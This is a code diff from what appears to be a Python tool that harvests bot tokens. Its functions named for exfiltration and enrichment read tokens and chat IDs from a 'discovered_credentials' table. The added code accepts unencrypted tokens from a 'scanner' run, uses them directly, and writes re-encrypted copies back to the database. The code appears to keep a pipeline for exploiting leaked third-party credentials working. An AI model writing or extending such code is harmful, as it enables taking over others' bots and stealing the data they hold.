@@ -50,11 +50,21 @@ async def _exfiltrate_logic(cred_id: str):
     
     logger.info(f"    [Exfil] Found Chat ID: {chat_id}")
     
-    # Decrypt
+    # Decrypt or Handle Legacy/Raw
     try:
-        bot_token = security.decrypt(encrypted_token)
+        if not encrypted_token.startswith("gAAAA"):
+            # Likely raw token from "bugged" scanner run
+            bot_token = encrypted_token
+            # SELF-HEAL: Encrypt and update DB
+            try:
+                new_enc = security.encrypt(bot_token)
+                db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id).execute()
+                logger.info(f"    🩹 [Exfil] Self-healed unencrypted token for {cred_id}")
+            except: pass
+        else:
+            bot_token = security.decrypt(encrypted_token)
     except Exception as e:
-        # Invalid token or key
+        # Invalid token or key mismatch
         logger.error(f"❌ [Exfil] Decryption failed for {cred_id}: {e}")
         db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
         return f"Decryption failed for {cred_id}: {e}"
@@ -131,9 +141,19 @@ async def _enrich_logic(cred_id: str):
     
     record = response.data[0]
     
-    # Decrypt
+    # Decrypt or Handle Legacy/Raw
     try:
-        bot_token = security.decrypt(record["bot_token"])
+        if not record["bot_token"].startswith("gAAAA"):
+             # Likely raw token
+            bot_token = record["bot_token"]
+            # SELF-HEAL
+            try:
+                new_enc = security.encrypt(bot_token)
+                db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id).execute()
+                logger.info(f"    🩹 [Enrich] Self-healed unencrypted token for {cred_id}")
+            except: pass
+        else:
+            bot_token = security.decrypt(record["bot_token"])
     except Exception as e:
         logger.error(f"❌ [Enrich] Decryption failed: {e}")
         db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
